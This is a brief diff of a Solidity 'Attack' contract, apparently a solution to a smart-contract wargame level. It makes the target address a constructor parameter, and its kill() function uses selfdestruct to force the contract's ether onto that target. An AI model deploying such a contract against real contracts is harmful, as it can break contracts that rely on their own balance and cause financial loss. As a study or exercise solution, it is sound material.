@@ -3,13 +3,13 @@ pragma solidity ^0.8.0;
 
 contract Attack {
 
-    address payable target_addr = payable("Instance address");
+    address payable targetAddr;
 
-    constructor() payable { // send ethers to the contract when deploying it
-        
+    constructor(address addr) payable { // send ethers to the contract when deploying it
+        targetAddr = payable(addr);
     }
 
     function kill() public {
-        selfdestruct(target_addr);
+        selfdestruct(targetAddr);
     }
 }
